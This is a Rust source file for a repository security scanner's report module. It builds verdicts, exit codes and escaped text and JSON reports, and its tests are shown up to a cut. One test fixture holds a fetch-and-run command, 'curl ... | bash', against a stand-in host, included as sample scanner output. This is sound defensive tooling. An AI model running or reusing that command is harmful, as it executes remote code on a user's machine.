//! The report: verdict, exit code, text and JSON (Task 7).
//!
//! Every string that came from the repo, a tool or the command line goes through `field` or
//! `clean` before it is printed or put in the JSON: hidden characters become escapes, secrets are
//! masked, and a line break cannot start a fake block. The JSON `triage` excerpts are read from
//! the scanned folder here, one file at a time, never through a symlink.

use std::collections::BTreeMap;
use std::fs::{self, File};
use std::io::{self, Read};
use std::path::{Component, Path, PathBuf};

use anthology_pycompat::json::{DumpOpts, Int, Map, Value, dumps};

use crate::escape::{cut, escape, mask};
use crate::tools::{ToolRun, ToolStatus};
use crate::{Finding, Group, Scan, Severity};

/// Where the scanned tree came from.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Source {
    Path,
    Url {
        url: String,
        rev: String,
        dest: PathBuf,
    },
}

/// What the CLI knows about a scan and the report prints next to it. For a folder scan, `target`
/// is the folder that was scanned (canonical): the JSON excerpts are read from it. For a URL scan
/// they are read from the quarantine folder.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Meta {
    pub target: String,
    pub source: Source,
    pub opened: bool,
    pub tools: Vec<ToolRun>,
}

/// Printed first when the scanned folder is already open in Claude Code.
pub const OPENED_WARNING: &str = "This folder is already open in Claude Code. Its hooks, env settings and MCP servers may have run when the session started, so the agent findings below may already have acted. If any agent finding is HIGH or CRITICAL: end this session, do not start Claude Code in this folder again, and rotate the API keys and tokens this machine holds. Install scripts, builds and editor tasks have not run unless you ran them.";

/// Printed in every report.
pub const NO_PROOF: &str = "No findings is not proof of safety.";

/// The license notice `anthology check-repo --notice` prints.
pub const NOTICE: &str = include_str!("../NOTICE");

/// Blocks the text report prints before it stops listing levels below HIGH.
const MAX_BLOCKS: usize = 200;
/// Triage items in the JSON; CRITICAL and HIGH items are never dropped, even past this.
const MAX_TRIAGE_ITEMS: usize = 200;
/// Characters of `seen` the report shows.
const SEEN_CHARS: usize = 160;
/// Characters of `why`, `do`, paths and other one-line fields.
const FIELD_CHARS: usize = 400;
/// Lines and bytes of a finding's excerpt in the triage block.
const EXCERPT_LINES: usize = 12;
const EXCERPT_BYTES: usize = 1200;
/// Bytes of one instruction file's excerpt, and of all of them.
const INSTRUCTION_BYTES: usize = 4000;
const INSTRUCTIONS_TOTAL: usize = 16_000;
/// Characters of `about`, and bytes read of one file for an excerpt.
const ABOUT_CHARS: usize = 800;
const READ_CAP: usize = 2 << 20;
/// Input past this is never escaped: a field is cut far sooner.
const FIELD_INPUT: usize = 64 << 10;

/// `Do not open` (any CRITICAL), `Review before opening` (any HIGH) or `No known-bad signals
/// found`.
pub fn verdict(s: &Scan) -> &'static str {
    let counts = counts(s);
    if counts[Severity::Critical as usize] > 0 {
        "Do not open"
    } else if counts[Severity::High as usize] > 0 {
        "Review before opening"
    } else {
        "No known-bad signals found"
    }
}

/// 2 for any CRITICAL; else 3 for an error or a partial scan; else 1 for any HIGH; else 0.
pub fn exit_code(s: &Scan) -> i32 {
    let counts = counts(s);
    if counts[Severity::Critical as usize] > 0 {
        2
    } else if s.partial || !s.errors.is_empty() {
        3
    } else if counts[Severity::High as usize] > 0 {
        1
    } else {
        0
    }
}

/// The number of findings at each level, indexed by `Severity as usize`.
fn counts(s: &Scan) -> [usize; 5] {
    let mut n = [0usize; 5];
    for f in &s.findings {
        n[f.severity as usize] += 1;
    }
    n
}

/// A fresh nonce: 16 hex characters from `/dev/urandom`.
pub fn new_nonce() -> io::Result<String> {
    let mut b = [0u8; 8];
    File::open("/dev/urandom")?.read_exact(&mut b)?;
    Ok(b.iter().map(|x| format!("{x:02x}")).collect())
}

/// `b` escaped, with secrets masked and line breaks kept.
fn clean(b: &[u8]) -> String {
    let b = &b[..b.len().min(FIELD_INPUT)];
    mask(&escape(b, usize::MAX))
}

/// One line of repo-derived text for the report: escaped, masked, line breaks and tabs written
/// out, cut at `max` characters.
fn field(s: &str, max: usize) -> String {
    let flat = clean(s.as_bytes())
        .replace('\n', "\\n")
        .replace('\t', "\\t");
    cut(&flat, max)
}

/// The findings in report order: severity high to low, then group, path, line and rule.
fn sorted(s: &Scan) -> Vec<&Finding> {
    let mut v: Vec<&Finding> = s.findings.iter().collect();
    v.sort_by(|a, b| {
        b.severity
            .cmp(&a.severity)
            .then(a.group.cmp(&b.group))
            .then_with(|| a.path.cmp(&b.path))
            .then(a.line.cmp(&b.line))
            .then_with(|| a.rule.cmp(&b.rule))
    });
    v
}

fn group_name(g: Group) -> &'static str {
    match g {
        Group::Agent => "agent",
        Group::Autorun => "autorun",
        Group::Hidden => "hidden",
        Group::Payload => "payload",
        Group::Exfil => "exfil",
        Group::Deps => "deps",
        Group::Yara => "yara",
        Group::Tool => "tool",
        Group::Scanner => "scanner",
    }
}

fn plural(n: usize, one: &str, many: &str) -> String {
    format!("{n} {}", if n == 1 { one } else { many })
}

/// `path` or `path:line`.
fn place(f: &Finding) -> String {
    let path = field(&f.path, FIELD_CHARS);
    if f.line > 0 {
        format!("{path}:{}", f.line)
    } else {
        path
    }
}

/// The command to work in the folder, only when its name is plain text a reader can copy
/// without surprise.
fn work_in(dest: &Path) -> Option<String> {
    let d = dest.to_str()?;
    let plain = !d.is_empty()
        && !d.starts_with('-')
        && !d.contains('\'')
        && !d.chars().any(char::is_control)
        && escape(d.as_bytes(), usize::MAX) == d;
    plain.then(|| format!("To work in it: git -C '{d}' status"))
}

/// The `tools:` line, then one `not run:` line for each tool that did not run.
fn tool_lines(tools: &[ToolRun]) -> Vec<String> {
    let ran: Vec<String> = tools
        .iter()
        .filter_map(|t| match &t.status {
            ToolStatus::Ran(n) => Some(format!(
                "{} ({})",
                t.name,
                plural(*n, "finding", "findings")
            )),
            _ => None,
        })
        .collect();
    let mut lines = vec![format!(
        "tools: {}",
        if ran.is_empty() {
            "none".to_string()
        } else {
            ran.join(", ")
        }
    )];
    for t in tools {
        match &t.status {
            ToolStatus::Ran(_) => {}
            ToolStatus::Missing(adds) => lines.push(format!(
                "not run: {} (not on PATH; it would add {adds})",
                t.name
            )),
            ToolStatus::Failed(why) => lines.push(format!(
                "not run: {} (failed: {})",
                t.name,
                field(why, FIELD_CHARS)
            )),
            ToolStatus::Skipped(why) => lines.push(format!(
                "not run: {} (skipped: {})",
                t.name,
                field(why, FIELD_CHARS)
            )),
        }
    }
    lines
}

/// The text report: the warning when `opened`, the verdict, the header, then the findings.
pub fn render_text(s: &Scan, m: &Meta) -> String {
    let mut out = String::new();
    if m.opened {
        out.push_str(OPENED_WARNING);
        out.push_str("\n\n");
    }
    out.push_str(verdict(s));
    out.push('\n');
    let c = counts(s);
    out.push_str(&format!(
        "CRITICAL {}  HIGH {}  MEDIUM {}  LOW {}  INFO {}\n",
        c[4], c[3], c[2], c[1], c[0]
    ));
    out.push_str(&format!("target: {}\n", field(&m.target, FIELD_CHARS)));
    if let Source::Url { rev, .. } = &m.source {
        out.push_str(&format!("rev: {}\n", field(rev, FIELD_CHARS)));
    }
    out.push_str(&format!(
        "scanned: {} in {} ms\n",
        plural(s.files, "file", "files"),
        s.scan_ms
    ));
    if !s.skipped.is_empty() {
        let shown: Vec<String> = s.skipped.iter().take(8).map(|p| field(p, 100)).collect();
        out.push_str(&format!("skipped: {}", shown.join(", ")));
        if s.skipped.len() > 8 {
            out.push_str(&format!(", \u{2026} {} more", s.skipped.len() - 8));
        }
        out.push('\n');
    }
    if s.partial {
        out.push_str("partial: a cap stopped the scan before every file was read\n");
    }
    for e in s.errors.iter().take(5) {
        out.push_str(&format!("error: {}\n", field(e, FIELD_CHARS)));
    }
    for line in tool_lines(&m.tools) {
        out.push_str(&line);
        out.push('\n');
    }
    if let Source::Url { dest, .. } = &m.source {
        out.push_str(&format!(
            "quarantine: {}\n",
            field(&dest.to_string_lossy(), FIELD_CHARS)
        ));
        if let Some(line) = work_in(dest) {
            out.push_str(&line);
            out.push('\n');
        }
    }
    out.push_str(NO_PROOF);
    out.push('\n');

    let findings = sorted(s);
    let mut printed = 0usize;
    for (i, f) in findings.iter().enumerate() {
        if f.severity < Severity::High && printed >= MAX_BLOCKS {
            break;
        }
        let hits = if f.count > 1 {
            format!(" ({} hits)", f.count)
        } else {
            String::new()
        };
        out.push_str(&format!(
            "\n[{}] F{} {} {}{hits}\n  why:  {}\n  seen: {}\n  do:   {}\n",
            f.severity.name(),
            i + 1,
            field(&f.rule, FIELD_CHARS),
            place(f),
            field(&f.why, FIELD_CHARS),
            field(&f.seen, SEEN_CHARS),
            field(&f.action, FIELD_CHARS),
        ));
        printed += 1;
    }
    let left = findings.len() - printed;
    if left > 0 {
        out.push_str(&format!(
            "\n\u{2026} {left} more lower findings: run with --json\n"
        ));
    }
    out
}

fn st(s: impl Into<String>) -> Value {
    Value::Str(s.into())
}

fn num(n: usize) -> Value {
    Value::Int(Int::Small(n as i64))
}

fn obj(pairs: Vec<(&str, Value)>) -> Value {
    let mut m = Map::new();
    for (k, v) in pairs {
        m.insert(k.to_string(), v);
    }
    Value::Object(m)
}

fn wrap(nonce: &str, body: &str) -> String {
    format!("<<untrusted-{nonce}>>{body}<</untrusted-{nonce}>>")
}

/// Up to `max` bytes of the file at the root-relative `rel`, never through a symlink: a link at
/// any step, a `..` or an absolute path is refused, and so is anything but a regular file.
fn read_inside(root: &Path, rel: &str, max: usize) -> io::Result<Vec<u8>> {
    let refuse = |why: &str| io::Error::new(io::ErrorKind::InvalidInput, why.to_string());
    let parts: Vec<Component> = Path::new(rel).components().collect();
    if parts.is_empty() {
        return Err(refuse("empty path"));
    }
    let mut at = root.to_path_buf();
    for (i, part) in parts.iter().enumerate() {
        let Component::Normal(name) = part else {
            return Err(refuse("path leaves the root"));
        };
        at.push(name);
        let kind = fs::symlink_metadata(&at)?.file_type();
        if kind.is_symlink() {
            return Err(refuse("symlink"));
        }
        let last = i + 1 == parts.len();
        if (last && !kind.is_file()) || (!last && !kind.is_dir()) {
            return Err(refuse("not a regular file"));
        }
    }
    let mut buf = Vec::new();
    File::open(&at)?.take(max as u64).read_to_end(&mut buf)?;
    Ok(buf)
}

/// The text of `bytes` for reading: UTF-16 decoded, anything else as it is.
fn as_text_bytes(bytes: Vec<u8>) -> Vec<u8> {
    match crate::files::decode(&bytes) {
        Some(t) => t.into_bytes(),
        None => bytes,
    }
}

/// `bytes` cut at `max` bytes, backing off to a character start.
fn cut_bytes(bytes: &[u8], max: usize) -> &[u8] {
    if bytes.len() <= max {
        return bytes;
    }
    let mut end = max;
    while end > 0 && (bytes[end] & 0xC0) == 0x80 {
        end -= 1;
    }
    &bytes[..end]
}

/// At most `lines` lines of `text` around `line` (the first lines for line 0), joined with `\n`,
/// a CRLF counting as one break.
fn window(text: &[u8], line: usize, lines: usize) -> Vec<u8> {
    let first = if line == 0 {
        1
    } else {
        line.saturating_sub(lines / 2 - 1).max(1)
    };
    let mut parts: Vec<&[u8]> = text.split(|&b| b == b'\n').collect();
    if text.last() == Some(&b'\n') {
        parts.pop();
    }
    let mut out = Vec::new();
    for (i, part) in parts.iter().skip(first - 1).take(lines).enumerate() {
        if i > 0 {
            out.push(b'\n');
        }
        out.extend_from_slice(part.strip_suffix(b"\r").unwrap_or(part));
    }
    out
}

/// The folder the excerpts are read from.
fn root_of(m: &Meta) -> PathBuf {
    match &m.source {
        Source::Path => PathBuf::from(&m.target),
        Source::Url { dest, .. } => dest.clone(),
    }
}

/// The JSON report; `nonce` marks the untrusted excerpts.
pub fn render_json(s: &Scan, m: &Meta, nonce: &str) -> String {
    let findings = sorted(s);
    let root = root_of(m);
    let c = counts(s);
    let mut notes: Vec<String> = Vec::new();

    let f_json: Vec<Value> = findings
        .iter()
        .enumerate()
        .map(|(i, f)| {
            obj(vec![
                ("id", st(format!("F{}", i + 1))),
                ("severity", st(f.severity.name())),
                ("group", st(group_name(f.group))),
                ("rule", st(field(&f.rule, FIELD_CHARS))),
                ("path", st(field(&f.path, FIELD_CHARS))),
                ("line", num(f.line)),
                ("why", st(field(&f.why, FIELD_CHARS))),
                ("seen", st(field(&f.seen, SEEN_CHARS))),
                ("do", st(field(&f.action, FIELD_CHARS))),
                ("count", num(f.count)),
            ])
        })
        .collect();

    // Triage items: every CRITICAL and HIGH finding, then MEDIUM ones fill what is left of
    // MAX_TRIAGE_ITEMS, most severe first, then by path. The text report and `findings` stay whole.
    let mut chosen: Vec<usize> = (0..findings.len())
        .filter(|&i| findings[i].severity >= Severity::High)
        .collect();
    let mut lower: Vec<usize> = (0..findings.len())
        .filter(|&i| findings[i].severity == Severity::Medium)
        .collect();
    lower.sort_by(|&a, &b| {
        findings[b]
            .severity
            .cmp(&findings[a].severity)
            .then_with(|| findings[a].path.cmp(&findings[b].path))
            .then(findings[a].line.cmp(&findings[b].line))
            .then(a.cmp(&b))
    });
    let room = MAX_TRIAGE_ITEMS.saturating_sub(chosen.len());
    if lower.len() > room {
        notes.push(format!(
            "{} more lower-severity findings not sent for triage; see the text report.",
            lower.len() - room
        ));
    }
    chosen.extend(lower.into_iter().take(room));

    // One read of each file, for every chosen finding in it.
    let mut by_path: BTreeMap<&str, Vec<usize>> = BTreeMap::new();
    for i in chosen {
        by_path
            .entry(findings[i].path.as_str())
            .or_default()
            .push(i);
    }
    let mut excerpts: BTreeMap<usize, String> = BTreeMap::new();
    for (path, ids) in &by_path {
        let text = read_inside(&root, path, READ_CAP).map(as_text_bytes).ok();
        for &i in ids {
            let f = findings[i];
            let around = text
                .as_deref()
                .map(|t| window(t, f.line, EXCERPT_LINES))
                .filter(|w| !w.is_empty());
            let body = match around {
                Some(w) => clean(cut_bytes(&w, EXCERPT_BYTES)),
                None => field(&f.seen, SEEN_CHARS),
            };
            excerpts.insert(i, wrap(nonce, &body));
        }
    }
    let items: Vec<Value> = excerpts
        .into_iter()
        .map(|(i, ex)| obj(vec![("id", st(format!("F{}", i + 1))), ("excerpt", st(ex))]))
        .collect();

    let mut paths: Vec<&String> = s.instructions.iter().collect();
    paths.sort();
    let mut left = INSTRUCTIONS_TOTAL;
    let mut instructions = Vec::new();
    let mut omitted = 0usize;
    for p in paths {
        if left == 0 {
            omitted += 1;
            continue;
        }
        let bytes = read_inside(&root, p, READ_CAP)
            .map(as_text_bytes)
            .unwrap_or_default();
        let part = cut_bytes(&bytes, INSTRUCTION_BYTES.min(left));
        left -= part.len();
        instructions.push(obj(vec![
            ("path", st(field(p, FIELD_CHARS))),
            ("excerpt", st(wrap(nonce, &clean(part)))),
        ]));
    }
    if omitted > 0 {
        notes.push(format!(
            "{} not excerpted: the instruction excerpts stop at 16 KB in all",
            plural(omitted, "instruction file", "instruction files")
        ));
    }
    for e in &s.errors {
        notes.push(format!("error: {}", field(e, FIELD_CHARS)));
    }
    if s.partial {
        notes.push("partial: a cap stopped the scan before every file was read".to_string());
    }
    notes.push(NO_PROOF.to_string());

    let tools: Vec<Value> = m
        .tools
        .iter()
        .map(|t| {
            let (status, detail) = match &t.status {
                ToolStatus::Ran(n) => ("ran", plural(*n, "finding", "findings")),
                ToolStatus::Missing(adds) => ("missing", (*adds).to_string()),
                ToolStatus::Failed(why) => ("failed", field(why, FIELD_CHARS)),
                ToolStatus::Skipped(why) => ("skipped", field(why, FIELD_CHARS)),
            };
            obj(vec![
                ("name", st(t.name)),
                ("status", st(status)),
                ("detail", st(detail)),
            ])
        })
        .collect();

    let (source, url, rev, quarantine) = match &m.source {
        Source::Path => ("path", Value::Null, Value::Null, Value::Null),
        Source::Url { url, rev, dest } => (
            "url",
            st(field(url, FIELD_CHARS)),
            st(field(rev, FIELD_CHARS)),
            st(field(&dest.to_string_lossy(), FIELD_CHARS)),
        ),
    };

    let v = obj(vec![
        ("version", num(1)),
        ("target", st(field(&m.target, FIELD_CHARS))),
        ("source", st(source)),
        ("url", url),
        ("rev", rev),
        ("quarantine", quarantine),
        ("opened", Value::Bool(m.opened)),
        ("verdict", st(verdict(s))),
        (
            "counts",
            obj(vec![
                ("CRITICAL", num(c[4])),
                ("HIGH", num(c[3])),
                ("MEDIUM", num(c[2])),
                ("LOW", num(c[1])),
                ("INFO", num(c[0])),
            ]),
        ),
        ("exit", num(exit_code(s) as usize)),
        ("partial", Value::Bool(s.partial)),
        ("files", num(s.files)),
        (
            "skipped",
            Value::Array(s.skipped.iter().map(|p| st(field(p, 100))).collect()),
        ),
        ("scan_ms", num(s.scan_ms as usize)),
        ("tools", Value::Array(tools)),
        ("findings", Value::Array(f_json)),
        (
            "triage",
            obj(vec![
                ("nonce", st(nonce)),
                ("about", st(wrap(nonce, &field(&s.about, ABOUT_CHARS)))),
                ("items", Value::Array(items)),
                ("instructions", Value::Array(instructions)),
            ]),
        ),
        ("report", st(render_text(s, m))),
        ("notes", Value::Array(notes.into_iter().map(st).collect())),
    ]);
    dumps(
        &v,
        &DumpOpts {
            indent: None,
            sort_keys: false,
            ensure_ascii: true,
            item_sep: ",",
            key_sep: ":",
        },
    )
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::tools::ToolStatus;
    use crate::{Finding, Group, Severity};
    use anthology_pycompat::json::{self, Value};

    const NONCE: &str = "0123456789abcdef";

    fn finding(sev: Severity, group: Group, rule: &str, path: &str, line: usize) -> Finding {
        Finding {
            severity: sev,
            group,
            rule: rule.to_string(),
            path: path.to_string(),
            line,
            why: "A task runs when the folder opens and fetches a script.".to_string(),
            seen: "curl -s https://example.invalid/p.sh | bash".to_string(),
            action: "Do not open this folder in an editor or an agent.".to_string(),
            count: 1,
        }
    }

    fn scan_of(findings: Vec<Finding>) -> Scan {
        Scan {
            findings,
            files: 10,
            scan_ms: 7,
            ..Scan::default()
        }
    }

    fn meta(target: &str) -> Meta {
        Meta {
            target: target.to_string(),
            source: Source::Path,
            opened: false,
            tools: Vec::new(),
        }
    }

    fn parse(s: &Scan, m: &Meta) -> json::Value {
        let text = render_json(s, m, NONCE);
        json::loads(&text).unwrap_or_else(|e| panic!("invalid JSON: {e:?}\n{text}"))
    }

    fn keys(v: &Value) -> Vec<String> {
        v.as_object()
            .expect("an object")
            .iter()
            .map(|(k, _)| k.to_string())
            .collect()
    }

    fn get<'a>(v: &'a Value, k: &str) -> &'a Value {
        v.as_object()
            .and_then(|m| m.get(k))
            .unwrap_or_else(|| panic!("missing key {k}"))
    }

    fn blocks(text: &str) -> usize {
        text.lines().filter(|l| l.starts_with('[')).count()
    }

    #[test]
    fn notice_credits_guarddog_under_apache() {
        assert!(NOTICE.contains("Datadog guarddog"), "{NOTICE}");
        assert!(NOTICE.contains("Apache License, Version 2.0"), "{NOTICE}");
    }

    #[test]
    fn verdicts() {
        let f = |sev| finding(sev, Group::Autorun, "r", "a", 1);
        assert_eq!(verdict(&scan_of(vec![])), "No known-bad signals found");
        for low in [Severity::Info, Severity::Low, Severity::Medium] {
            assert_eq!(
                verdict(&scan_of(vec![f(low)])),
                "No known-bad signals found"
            );
        }
        assert_eq!(
            verdict(&scan_of(vec![f(Severity::High)])),
            "Review before opening"
        );
        assert_eq!(
            verdict(&scan_of(vec![f(Severity::Critical)])),
            "Do not open"
        );
        assert_eq!(
            verdict(&scan_of(vec![f(Severity::High), f(Severity::Critical)])),
            "Do not open"
        );
    }

    #[test]
    fn exit_code_precedence() {
        let f = |sev| finding(sev, Group::Autorun, "r", "a", 1);
        let with = |sev: Option<Severity>, partial: bool, error: bool| {
            let mut s = scan_of(sev.map(f).into_iter().collect());
            s.partial = partial;
            if error {
                s.errors.push("could not read a.txt".to_string());
            }
            exit_code(&s)
        };
        // 2: any CRITICAL, even partial and with an error.
        assert_eq!(with(Some(Severity::Critical), true, true), 2);
        // 3: an error or a partial scan outranks HIGH.
        assert_eq!(with(Some(Severity::High), true, false), 3);
        assert_eq!(with(Some(Severity::High), false, true), 3);
        assert_eq!(with(None, true, false), 3);
        // 1: HIGH on a complete scan.
        assert_eq!(with(Some(Severity::High), false, false), 1);
        // 0: nothing above MEDIUM.
        assert_eq!(with(Some(Severity::Medium), false, false), 0);
        assert_eq!(with(None, false, false), 0);
    }

    #[test]
    fn opened_warning_comes_first() {
        let s = scan_of(vec![finding(
            Severity::High,
            Group::Agent,
            "agent.x",
            "a",
            1,
        )]);
        let mut m = meta("/r");
        let plain = render_text(&s, &m);
        assert!(!plain.contains(OPENED_WARNING), "{plain}");
        m.opened = true;
        let text = render_text(&s, &m);
        assert!(text.starts_with(OPENED_WARNING), "{text}");
        assert!(text.contains(NO_PROOF), "{text}");
        assert!(text.find("Review before opening") > text.find(OPENED_WARNING));
    }

    #[test]
    fn warning_and_no_proof_copy_is_exact() {
        assert_eq!(
            OPENED_WARNING,
            "This folder is already open in Claude Code. Its hooks, env settings and MCP servers may have run when the session started, so the agent findings below may already have acted. If any agent finding is HIGH or CRITICAL: end this session, do not start Claude Code in this folder again, and rotate the API keys and tokens this machine holds. Install scripts, builds and editor tasks have not run unless you ran them."
        );
        assert_eq!(NO_PROOF, "No findings is not proof of safety.");
    }

    #[test]
    fn header_has_verdict_counts_tools_and_the_note() {
        let mut s = scan_of(vec![
            finding(Severity::Critical, Group::Autorun, "a.b", "p", 1),
            finding(Severity::Medium, Group::Autorun, "a.c", "q", 1),
            finding(Severity::Medium, Group::Autorun, "a.d", "r", 1),
            finding(Severity::Info, Group::Autorun, "a.e", "s", 0),
        ]);
        s.skipped.push("node_modules/".to_string());
        let mut m = meta("/r");
        m.tools = vec![
            ToolRun {
                name: "gitleaks",
                status: ToolStatus::Ran(2),
            },
            ToolRun {
                name: "zizmor",
                status: ToolStatus::Missing("GitHub Actions workflow checks"),
            },
            ToolRun {
                name: "osv-scanner",
                status: ToolStatus::Skipped("no offline database".to_string()),
            },
        ];
        let text = render_text(&s, &m);
        let head: Vec<&str> = text.lines().take(12).collect();
        assert_eq!(head[0], "Do not open", "{text}");
        // The counts sit right under the verdict; the target follows.
        assert_eq!(
            head[1], "CRITICAL 1  HIGH 0  MEDIUM 2  LOW 0  INFO 1",
            "{text}"
        );
        assert_eq!(head[2], "target: /r", "{text}");
        assert!(
            text.contains("\nCRITICAL 1  HIGH 0  MEDIUM 2  LOW 0  INFO 1\n"),
            "{text}"
        );
        assert!(text.contains("\ntools: gitleaks (2 findings)\n"), "{text}");
        assert!(
            text.contains(
                "\nnot run: zizmor (not on PATH; it would add GitHub Actions workflow checks)\n"
            ),
            "{text}"
        );
        assert!(
            text.contains("\nnot run: osv-scanner (skipped: no offline database)\n"),
            "{text}"
        );
        assert!(text.contains("\nskipped: node_modules/\n"), "{text}");
        assert!(text.contains(&format!("\n{NO_PROOF}\n")), "{text}");
        // The note ends the header, before the first finding.
        assert!(text.find(NO_PROOF) < text.find("[CRITICAL]"), "{text}");
    }

    #[test]
    fn quarantine_names_the_folder_and_how_to_work_in_it() {
        let s = scan_of(vec![]);
        let mut m = meta("https://example.invalid/o/r");
        m.source = Source::Url {
            url: "https://example.invalid/o/r".to_string(),
            rev: "HEAD".to_string(),
            dest: PathBuf::from("/tmp/anthology-check-repo/h-o-r-1"),
        };
        let text = render_text(&s, &m);
        assert!(
            text.contains("\nquarantine: /tmp/anthology-check-repo/h-o-r-1\n"),
            "{text}"
        );
        assert!(
            text.contains("\nTo work in it: git -C '/tmp/anthology-check-repo/h-o-r-1' status\n"),
            "{text}"
        );
        // A folder name with a quote or a line break gets no copyable command.
        for odd in ["/tmp/it's", "/tmp/a\nb", "-dash"] {
            m.source = Source::Url {
                url: "https://example.invalid/o/r".to_string(),
                rev: "HEAD".to_string(),
                dest: PathBuf::from(odd),
            };
            let text = render_text(&s, &m);
            assert!(!text.contains("git -C"), "{odd:?}: {text}");
            assert!(text.contains("quarantine: "), "{text}");
            assert!(
                !text.contains("quarantine: /tmp/a\nb"),
                "a raw line break in the folder name: {text}"
            );
        }
        // A folder scan has no quarantine line.
        assert!(!render_text(&s, &meta("/r")).contains("quarantine:"));
    }

    #[test]
    fn a_finding_block_has_why_seen_and_do() {
        let mut f = finding(
            Severity::Critical,
            Group::Autorun,
            "autorun.vscode-folder-open",
            ".vscode/tasks.json",
            7,
        );
        f.count = 3;
        let text = render_text(&scan_of(vec![f]), &meta("/r"));
        let block = "[CRITICAL] F1 autorun.vscode-folder-open .vscode/tasks.json:7 (3 hits)\n  why:  A task runs when the folder opens and fetches a script.\n  seen: curl -s https://example.invalid/p.sh | bash\n  do:   Do not open this folder in an editor or an agent.\n";
        assert!(text.contains(block), "{text}");
        // A finding on a whole file has no line.
        let f = finding(Severity::High, Group::Payload, "payload.x", "a/b.png", 0);
        let text = render_text(&scan_of(vec![f]), &meta("/r"));
        assert!(text.contains("[HIGH] F1 payload.x a/b.png\n"), "{text}");
    }

    #[test]
    fn findings_sort_by_severity_then_group_then_path_then_line() {
        let s = scan_of(vec![
            finding(Severity::Low, Group::Agent, "r.low", "a", 1),
            finding(Severity::High, Group::Hidden, "r.hidden", "b", 1),
            finding(Severity::High, Group::Agent, "r.agent-z", "z", 9),
            finding(Severity::High, Group::Agent, "r.agent-a2", "a", 9),
            finding(Severity::High, Group::Agent, "r.agent-a1", "a", 2),
            finding(Severity::Critical, Group::Scanner, "r.crit", "c", 1),
        ]);
        let text = render_text(&s, &meta("/r"));
        let order: Vec<&str> = text
            .lines()
            .filter(|l| l.starts_with('['))
            .map(|l| l.split(' ').nth(2).unwrap())
            .collect();
        assert_eq!(
            order,
            [
                "r.crit",
                "r.agent-a1",
                "r.agent-a2",
                "r.agent-z",
                "r.hidden",
                "r.low"
            ]
        );
        let ids: Vec<&str> = text
            .lines()
            .filter(|l| l.starts_with('['))
            .map(|l| l.split(' ').nth(1).unwrap())
            .collect();
        assert_eq!(ids, ["F1", "F2", "F3", "F4", "F5", "F6"]);
    }

    #[test]
    fn seen_is_escaped_masked_flattened_and_cut() {
        let token = format!("gh{}_{}", "p", "A1b2C3d4".repeat(5));
        let mut f = finding(Severity::High, Group::Hidden, "hidden.bidi", "p", 1);
        f.seen = format!("a\u{202E}b {token} line\nsecond\t{}", "x".repeat(400));
        f.why = "why\nsecond line".to_string();
        let text = render_text(&scan_of(vec![f]), &meta("/r"));
        let seen = text.lines().find(|l| l.starts_with("  seen: ")).unwrap();
        assert!(
            seen.starts_with("  seen: a\\u{202E}b <secret:github-token> line\\nsecond\\tx"),
            "{seen}"
        );
        assert!(!seen.contains("A1b2"), "{seen}");
        assert_eq!(seen.chars().count(), "  seen: ".len() + 160 + 1, "{seen}");
        assert!(seen.ends_with('\u{2026}'), "{seen}");
        // A line break in a field cannot start a fake block or header line.
        assert!(text.contains("  why:  why\\nsecond line\n"), "{text}");
        assert!(!text.contains("\nsecond"), "{text}");
    }

    #[test]
    fn a_path_with_hidden_characters_is_shown_escaped() {
        let f = finding(
            Severity::High,
            Group::Hidden,
            "hidden.homoglyph-name",
            "src/gradl\u{435}\u{202E}w.jar",
            0,
        );
        let s = scan_of(vec![f]);
        let text = render_text(&s, &meta("/r/\u{1B}[2J"));
        assert!(text.contains("gradl\u{435}\\u{202E}w.jar"), "{text}");
        assert!(!text.contains('\u{202E}'), "{text}");
        assert!(!text.contains('\u{1B}'), "{text}");
        let js = render_json(&s, &meta("/r"), NONCE);
        assert!(!js.contains('\u{202E}'), "{js}");
    }

    fn many(n: usize, sev: Severity, tag: &str) -> Vec<Finding> {
        (0..n)
            .map(|i| {
                finding(
                    sev,
                    Group::Autorun,
                    &format!("{tag}.{i:04}"),
                    &format!("f{i:04}"),
                    1,
                )
            })
            .collect()
    }

    fn note_list(v: &Value) -> Vec<String> {
        get(v, "notes")
            .as_array()
            .unwrap()
            .iter()
            .filter_map(|n| n.as_str().map(str::to_string))
            .collect()
    }

    #[test]
    fn triage_items_cap_at_200_and_say_so() {
        let v = parse(&scan_of(many(250, Severity::Medium, "m")), &meta("/r"));
        let items = get(get(&v, "triage"), "items").as_array().unwrap();
        assert_eq!(items.len(), 200);
        let notes = note_list(&v);
        let want = "50 more lower-severity findings not sent for triage; see the text report.";
        assert!(notes.iter().any(|n| n == want), "{notes:?}");
        // The findings list itself is not capped.
        assert_eq!(get(&v, "findings").as_array().unwrap().len(), 250);
    }

    #[test]
    fn triage_items_never_drop_high_or_critical() {
        let mut all = many(210, Severity::High, "h");
        all.extend(many(5, Severity::Critical, "c"));
        all.extend(many(30, Severity::Medium, "m"));
        let v = parse(&scan_of(all), &meta("/r"));
        let items = get(get(&v, "triage"), "items").as_array().unwrap();
        // 215 HIGH and CRITICAL, no room left for the 30 MEDIUM.
        assert_eq!(items.len(), 215);
        let notes = note_list(&v);
        let want = "30 more lower-severity findings not sent for triage; see the text report.";
        assert!(notes.iter().any(|n| n == want), "{notes:?}");
        // Exactly 210 HIGH: all of them, and no note.
        let v = parse(&scan_of(many(210, Severity::High, "h")), &meta("/r"));
        let items = get(get(&v, "triage"), "items").as_array().unwrap();
        assert_eq!(items.len(), 210);
        assert!(
            !note_list(&v)
                .iter()
                .any(|n| n.contains("not sent for triage"))
        );
    }

    #[test]
    fn triage_items_fill_the_rest_with_the_most_severe_then_by_path() {
        let mut all = many(190, Severity::High, "h");
        let mut med = many(30, Severity::Medium, "m");
        med.iter_mut().for_each(|f| f.path = format!("z{}", f.path));
        all.extend(med);
        all.extend(many(30, Severity::Medium, "n"));
        let v = parse(&scan_of(all), &meta("/r"));
        let items = get(get(&v, "triage"), "items").as_array().unwrap();
        assert_eq!(items.len(), 200);
        // Ten MEDIUM slots go to the paths that sort first (f0000..f0009), not the z-paths.
        let findings = get(&v, "findings").as_array().unwrap();
        let ids: Vec<&str> = items
            .iter()
            .map(|i| get(i, "id").as_str().unwrap())
            .collect();
        let mut medium_paths: Vec<&str> = findings
            .iter()
            .filter(|f| get(f, "severity").as_str() == Some("MEDIUM"))
            .filter(|f| ids.contains(&get(f, "id").as_str().unwrap()))
            .map(|f| get(f, "path").as_str().unwrap())
            .collect();
        medium_paths.sort();
        assert_eq!(medium_paths.len(), 10);
        assert!(
